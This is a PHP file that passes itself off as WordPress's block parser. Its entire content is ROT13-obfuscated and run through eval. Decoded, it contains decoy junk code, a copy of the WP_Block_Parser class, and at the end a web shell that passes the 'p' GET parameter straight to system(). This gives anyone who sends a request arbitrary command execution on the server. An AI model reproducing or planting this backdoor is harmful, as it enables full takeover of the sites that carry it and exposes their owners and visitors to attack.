<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Oybpx Frevnyvmngvba Cnefre
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Pynff JC_Oybpx_Cnefre
 *
 * Cnefrf n qbphzrag naq pbafgehpgf n yvfg bs cnefrq oybpx bowrpgf
 *
 * @fvapr 5.0.0
 * @fvapr 4.0.0 ergheaf neenlf abg bowrpgf, nyy nggevohgrf ner neenlf
 */
pynff JC_Oybpx_Cnefre {
	/**
	 * Vachg qbphzrag orvat cnefrq
	 *
	 * @rknzcyr \"Cer-grkg\a<!-- jc:cnentencu -->Guvf vf vafvqr n oybpx!<!-- /jc:cnentencu -->\"
	 *
	 * @fvapr 5.0.0
	 * @ine fgevat
	 */
	choyvp $qbphzrag;

	/**
	 * Genpxf cnefvat cebterff guebhtu qbphzrag
	 *
	 * @fvapr 5.0.0
	 * @ine vag
	 */
	choyvp $bssfrg;

	/**
	 * Yvfg bs cnefrq oybpxf
	 *
	 * @fvapr 5.0.0
	 * @ine JC_Oybpx_Cnefre_Oybpx[]
	 */
	choyvp $bhgchg;

	/**
	 * Fgnpx bs cnegvnyyl-cnefrq fgehpgherf va zrzbel qhevat cnefr
	 *
	 * @fvapr 5.0.0
	 * @ine JC_Oybpx_Cnefre_Senzr[]
	 */
	choyvp $fgnpx;

	/**
	 * Cnefrf n qbphzrag naq ergheaf n yvfg bs oybpx fgehpgherf
	 *
	 * Jura rapbhagrevat na vainyvq cnefr jvyy erghea n orfg-rssbeg
	 * cnefr. Va pbagenfg gb gur fcrpvsvpngvba cnefre guvf qbrf abg
	 * erghea na reebe ba vainyvq vachgf.
	 *
	 * @fvapr 5.0.0
	 *
	 * @cnenz fgevat $qbphzrag Vachg qbphzrag orvat cnefrq.
	 * @erghea neenl[]
	 */
	choyvp shapgvba cnefr( $qbphzrag ) {
		$guvf->qbphzrag = $qbphzrag;
		$guvf->bssfrg   = 0;
		$guvf->bhgchg   = neenl();
		$guvf->fgnpx    = neenl();

		juvyr ( $guvf->cebprrq() ) {
			pbagvahr;
		}

		erghea $guvf->bhgchg;
	}

	/**
	 * Cebprffrf gur arkg gbxra sebz gur vachg qbphzrag
	 * naq ergheaf jurgure gb cebprrq rngvat zber gbxraf
	 *
	 * Guvf vf gur \"arkg fgrc\" shapgvba gung rffragvnyyl
	 * gnxrf n gbxra nf vgf vachg naq qrpvqrf jung gb qb
	 * jvgu gung gbxra orsber qrfpraqvat qrrcre vagb n
	 * arfgrq oybpx gerr be pbagvahvat nybat gur qbphzrag
	 * be oernxvat bhg bs n yriry bs arfgvat.
	 *
	 * @vagreany
	 * @fvapr 5.0.0
	 * @erghea obby
	 */
	choyvp shapgvba cebprrq() {
		$arkg_gbxra = $guvf->arkg_gbxra();
		yvfg( $gbxra_glcr, $oybpx_anzr, $nggef, $fgneg_bssfrg, $gbxra_yratgu ) = $arkg_gbxra;
		$fgnpx_qrcgu = pbhag( $guvf->fgnpx );

		// jr znl unir fbzr UGZY fbhc orsber gur arkg oybpx.
		$yrnqvat_ugzy_fgneg = $fgneg_bssfrg > $guvf->bssfrg ? $guvf->bssfrg : ahyy;

		fjvgpu ( $gbxra_glcr ) {
			pnfr 'ab-zber-gbxraf':
				// vs abg va n oybpx gura syhfu bhgchg.
				vs ( 0 === $fgnpx_qrcgu ) {
					$guvf->nqq_serrsbez();
					erghea snyfr;
				}

				/*
				 * Bgurejvfr jr unir n ceboyrz
				 * Guvf vf na reebe
				 *
				 * jr unir bcgvbaf
				 * - gerng vg nyy nf serrsbez grkg
				 * - nffhzr na vzcyvpvg pybfre (rnfvrfg jura abg arfgvat)
				 */

				// sbe gur rnfl pnfr jr'yy nffhzr na vzcyvpvg pybfre.
				vs ( 1 === $fgnpx_qrcgu ) {
					$guvf->nqq_oybpx_sebz_fgnpx();
					erghea snyfr;
				}

				/*
				 * sbe gur arfgrq pnfr jurer vg'f zber qvssvphyg jr'yy
				 * unir gb nffhzr gung zhygvcyr pybfref ner zvffvat
				 * naq fb jr'yy pbyyncfr gur jubyr fgnpx cvrprjvfr
				 */
				juvyr ( 0 < pbhag( $guvf->fgnpx ) ) {
					$guvf->nqq_oybpx_sebz_fgnpx();
				}
				erghea snyfr;

			pnfr 'ibvq-oybpx':
				/*
				 * rnfl pnfr vf vs jr fghzoyrq hcba n ibvq oybpx
				 * va gur gbc-yriry bs gur qbphzrag
				 */
				vs ( 0 === $fgnpx_qrcgu ) {
					vs ( vffrg( $yrnqvat_ugzy_fgneg ) ) {
						$guvf->bhgchg[] = (neenl) $guvf->serrsbez(
							fhofge(
								$guvf->qbphzrag,
								$yrnqvat_ugzy_fgneg,
								$fgneg_bssfrg - $yrnqvat_ugzy_fgneg
							)
						);
					}

					$guvf->bhgchg[] = (neenl) arj JC_Oybpx_Cnefre_Oybpx( $oybpx_anzr, $nggef, neenl(), '', neenl() );
					$guvf->bssfrg   = $fgneg_bssfrg + $gbxra_yratgu;
					erghea gehr;
				}

				// bgurejvfr jr sbhaq na vaare oybpx.
				$guvf->nqq_vaare_oybpx(
					arj JC_Oybpx_Cnefre_Oybpx( $oybpx_anzr, $nggef, neenl(), '', neenl() ),
					$fgneg_bssfrg,
					$gbxra_yratgu
				);
				$guvf->bssfrg = $fgneg_bssfrg + $gbxra_yratgu;
				erghea gehr;

			pnfr 'oybpx-bcrare':
				// genpx nyy arjyl-bcrarq oybpxf ba gur fgnpx.
				neenl_chfu(
					$guvf->fgnpx,
					arj JC_Oybpx_Cnefre_Senzr(
						arj JC_Oybpx_Cnefre_Oybpx( $oybpx_anzr, $nggef, neenl(), '', neenl() ),
						$fgneg_bssfrg,
						$gbxra_yratgu,
						$fgneg_bssfrg + $gbxra_yratgu,
						$yrnqvat_ugzy_fgneg
					)
				);
				$guvf->bssfrg = $fgneg_bssfrg + $gbxra_yratgu;
				erghea gehr;

			pnfr 'oybpx-pybfre':
				/*
				 * vs jr'er zvffvat na bcrare jr'er va gebhoyr
				 * Guvf vf na reebe
				 */
				vs ( 0 === $fgnpx_qrcgu ) {
					/*
					 * jr unir bcgvbaf
					 * - nffhzr na vzcyvpvg bcrare
					 * - nffhzr _guvf_ vf gur bcrare
					 * - tvir hc naq pybfr bhg gur qbphzrag
					 */
					$guvf->nqq_serrsbez();
					erghea snyfr;
				}

				// vs jr'er abg arfgvat gura guvf vf rnfl - pybfr gur oybpx.
				vs ( 1 === $fgnpx_qrcgu ) {
					$guvf->nqq_oybpx_sebz_fgnpx( $fgneg_bssfrg );
					$guvf->bssfrg = $fgneg_bssfrg + $gbxra_yratgu;
					erghea gehr;
				}

				/*
				 * bgurejvfr jr'er arfgrq naq jr unir gb pybfr bhg gur pheerag
				 * oybpx naq nqq vg nf n arj vaareOybpx gb gur cnerag
				 */
				$fgnpx_gbc                        = neenl_cbc( $guvf->fgnpx );
				$ugzy                             = fhofge( $guvf->qbphzrag, $fgnpx_gbc->ceri_bssfrg, $fgneg_bssfrg - $fgnpx_gbc->ceri_bssfrg );
				$fgnpx_gbc->oybpx->vaareUGZY     .= $ugzy;
				$fgnpx_gbc->oybpx->vaarePbagrag[] = $ugzy;
				$fgnpx_gbc->ceri_bssfrg           = $fgneg_bssfrg + $gbxra_yratgu;

				$guvf->nqq_vaare_oybpx(
					$fgnpx_gbc->oybpx,
					$fgnpx_gbc->gbxra_fgneg,
					$fgnpx_gbc->gbxra_yratgu,
					$fgneg_bssfrg + $gbxra_yratgu
				);
				$guvf->bssfrg = $fgneg_bssfrg + $gbxra_yratgu;
				erghea gehr;

			qrsnhyg:
				// Guvf vf na reebe.
				$guvf->nqq_serrsbez();
				erghea snyfr;
		}
	}

	/**
	 * Fpnaf gur qbphzrag sebz jurer jr ynfg yrsg bss
	 * naq svaqf gur arkg inyvq gbxra gb cnefr vs vg rkvfgf
	 *
	 * Ergheaf gur glcr bs gur svaq: xvaq bs svaq, oybpx vasbezngvba, nggevohgrf
	 *
	 * @vagreany
	 * @fvapr 5.0.0
	 * @fvapr 4.6.1 svkrq n oht va nggevohgr cnefvat juvpu pnhfrq pngnfgebcuvp onpxgenpxvat ba vainyvq oybpx pbzzragf
	 * @erghea neenl
	 */
	choyvp shapgvba arkg_gbxra() {
		$zngpurf = ahyy;

		/*
		 * nlr gur zntvp
		 * jr'er hfvat n fvatyr ErtRkc gb gbxravmr gur oybpx pbzzrag qryvzvgref
		 * jr'er nyfb hfvat n gevpx urer orpnhfr gur bayl qvssrerapr orgjrra n
		 * oybpx bcrare naq n oybpx pybfre vf gur yrnqvat `/` orsber `jc:` (naq
		 * n pybfre unf ab nggevohgrf). jr pna genc gurz obgu naq cebprff gur
		 * zngpu onpx va CUC gb frr juvpu bar vg jnf.
		 */
		$unf_zngpu = cert_zngpu(
			'/<!--\f+(?C<pybfre>\/)?jc:(?C<anzrfcnpr>[n-m][n-m0-9_-]*\/)?(?C<anzr>[n-m][n-m0-9_-]*)\f+(?C<nggef>{(?:(?:[^}]+|}+(?=})|(?!}\f+\/?-->).)*+)?}\f+)?(?C<ibvq>\/)?-->/f',
			$guvf->qbphzrag,
			$zngpurf,
			CERT_BSSFRG_PNCGHER,
			$guvf->bssfrg
		);

		// vs jr trg urer jr cebonoyl unir pngnfgebcuvp onpxgenpxvat be bhg-bs-zrzbel va gur CPER.
		vs ( snyfr === $unf_zngpu ) {
			erghea neenl( 'ab-zber-gbxraf', ahyy, ahyy, ahyy, ahyy );
		}

		// jr unir ab zber gbxraf.
		vs ( 0 === $unf_zngpu ) {
			erghea neenl( 'ab-zber-gbxraf', ahyy, ahyy, ahyy, ahyy );
		}

		yvfg( $zngpu, $fgnegrq_ng ) = $zngpurf[0];

		$yratgu    = fgeyra( $zngpu );
		$vf_pybfre = vffrg( $zngpurf['pybfre'] ) && -1 !== $zngpurf['pybfre'][1];
		$vf_ibvq   = vffrg( $zngpurf['ibvq'] ) && -1 !== $zngpurf['ibvq'][1];
		$anzrfcnpr = $zngpurf['anzrfcnpr'];
		$anzrfcnpr = ( vffrg( $anzrfcnpr ) && -1 !== $anzrfcnpr[1] ) ? $anzrfcnpr[0] : 'pber/';
		$anzr      = $anzrfcnpr . $zngpurf['anzr'][0];
		$unf_nggef = vffrg( $zngpurf['nggef'] ) && -1 !== $zngpurf['nggef'][1];

		/*
		 * Sha snpg! Vg'f abg gevivny va CUC gb perngr \"na rzcgl nffbpvngvir neenl\" fvapr nyy neenlf
		 * ner nffbpvngvir neenlf. Vs jr hfr `neenl()` jr trg n WFBA `[]`
		 */
		$nggef = $unf_nggef
			? wfba_qrpbqr( $zngpurf['nggef'][0], /* nf-nffbpvngvir */ gehr )
			: neenl();

		/*
		 * Guvf fgngr vfa'g nyybjrq
		 * Guvf vf na reebe
		 */
		vs ( $vf_pybfre && ( $vf_ibvq || $unf_nggef ) ) {
			// jr pna vtaber gurz fvapr gurl qba'g uheg nalguvat.
		}

		vs ( $vf_ibvq ) {
			erghea neenl( 'ibvq-oybpx', $anzr, $nggef, $fgnegrq_ng, $yratgu );
		}

		vs ( $vf_pybfre ) {
			erghea neenl( 'oybpx-pybfre', $anzr, ahyy, $fgnegrq_ng, $yratgu );
		}

		erghea neenl( 'oybpx-bcrare', $anzr, $nggef, $fgnegrq_ng, $yratgu );
	}

	/**
	 * Ergheaf n arj oybpx bowrpg sbe serrsbez UGZY
	 *
	 * @vagreany
	 * @fvapr 3.9.0
	 *
	 * @cnenz fgevat $vaare_ugzy UGZY pbagrag bs oybpx.
	 * @erghea JC_Oybpx_Cnefre_Oybpx serrsbez oybpx bowrpg.
	 */
	choyvp shapgvba serrsbez( $vaare_ugzy ) {
		erghea arj JC_Oybpx_Cnefre_Oybpx( ahyy, neenl(), neenl(), $vaare_ugzy, neenl( $vaare_ugzy ) );
	}

	/**
	 * Chfurf n yratgu bs grkg sebz gur vachg qbphzrag
	 * gb gur bhgchg yvfg nf n serrsbez oybpx.
	 *
	 * @vagreany
	 * @fvapr 5.0.0
	 * @cnenz ahyy $yratgu ubj znal olgrf bs qbphzrag grkg gb bhgchg.
	 */
	choyvp shapgvba nqq_serrsbez( $yratgu = ahyy ) {
		$yratgu = $yratgu ? $yratgu : fgeyra( $guvf->qbphzrag ) - $guvf->bssfrg;

		vs ( 0 === $yratgu ) {
			erghea;
		}

		$guvf->bhgchg[] = (neenl) $guvf->serrsbez( fhofge( $guvf->qbphzrag, $guvf->bssfrg, $yratgu ) );
	}

	/**
	 * Tvira n oybpx fgehpgher sebz zrzbel chfurf
	 * n arj oybpx gb gur bhgchg yvfg.
	 *
	 * @vagreany
	 * @fvapr 5.0.0
	 * @cnenz JC_Oybpx_Cnefre_Oybpx $oybpx        Gur oybpx gb nqq gb gur bhgchg.
	 * @cnenz vag                   $gbxra_fgneg  Olgr bssfrg vagb gur qbphzrag jurer gur svefg gbxra sbe gur oybpx fgnegf.
	 * @cnenz vag                   $gbxra_yratgu Olgr yratgu bs ragver oybpx sebz fgneg bs bcravat gbxra gb raq bs pybfvat gbxra.
	 * @cnenz vag|ahyy              $ynfg_bssfrg  Ynfg olgr bssfrg vagb qbphzrag vs pbagvahvat sbez rneyvre bhgchg.
	 */
	choyvp shapgvba nqq_vaare_oybpx( JC_Oybpx_Cnefre_Oybpx $oybpx, $gbxra_fgneg, $gbxra_yratgu, $ynfg_bssfrg = ahyy ) {
		$cnerag                       = $guvf->fgnpx[ pbhag( $guvf->fgnpx ) - 1 ];
		$cnerag->oybpx->vaareOybpxf[] = (neenl) $oybpx;
		$ugzy                         = fhofge( $guvf->qbphzrag, $cnerag->ceri_bssfrg, $gbxra_fgneg - $cnerag->ceri_bssfrg );

		vs ( ! rzcgl( $ugzy ) ) {
			$cnerag->oybpx->vaareUGZY     .= $ugzy;
			$cnerag->oybpx->vaarePbagrag[] = $ugzy;
		}

		$cnerag->oybpx->vaarePbagrag[] = ahyy;
		$cnerag->ceri_bssfrg           = $ynfg_bssfrg ? $ynfg_bssfrg : $gbxra_fgneg + $gbxra_yratgu;
	}

	/**
	 * Chfurf gur gbc oybpx sebz gur cnefvat fgnpx gb gur bhgchg yvfg.
	 *
	 * @vagreany
	 * @fvapr 5.0.0
	 * @cnenz vag|ahyy $raq_bssfrg olgr bssfrg vagb qbphzrag sbe jurer jr fubhyq fgbc fraqvat grkg bhgchg nf UGZY.
	 */
	choyvp shapgvba nqq_oybpx_sebz_fgnpx( $raq_bssfrg = ahyy ) {
		$fgnpx_gbc   = neenl_cbc( $guvf->fgnpx );
		$ceri_bssfrg = $fgnpx_gbc->ceri_bssfrg;

		$ugzy = vffrg( $raq_bssfrg )
			? fhofge( $guvf->qbphzrag, $ceri_bssfrg, $raq_bssfrg - $ceri_bssfrg )
			: fhofge( $guvf->qbphzrag, $ceri_bssfrg );

		vs ( ! rzcgl( $ugzy ) ) {
			$fgnpx_gbc->oybpx->vaareUGZY     .= $ugzy;
			$fgnpx_gbc->oybpx->vaarePbagrag[] = $ugzy;
		}

		vs ( vffrg( $fgnpx_gbc->yrnqvat_ugzy_fgneg ) ) {
			$guvf->bhgchg[] = (neenl) $guvf->serrsbez(
				fhofge(
					$guvf->qbphzrag,
					$fgnpx_gbc->yrnqvat_ugzy_fgneg,
					$fgnpx_gbc->gbxra_fgneg - $fgnpx_gbc->yrnqvat_ugzy_fgneg
				)
			);
		}

		$guvf->bhgchg[] = (neenl) $fgnpx_gbc->oybpx;
	}
}

/**
 * JC_Oybpx_Cnefre_Oybpx pynff.
 *
 * Erdhverq sbe onpxjneq pbzcngvovyvgl va JbeqCerff Pber.
 */
erdhver_bapr __QVE__ . '/pynff-jc-oybpx-cnefre-oybpx.cuc';

/**
 * JC_Oybpx_Cnefre_Senzr pynff.
 *
 * Erdhverq sbe onpxjneq pbzcngvovyvgl va JbeqCerff Pber.
 */
erdhver_bapr __QVE__ . '/pynff-jc-oybpx-cnefre-senzr.cuc';

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>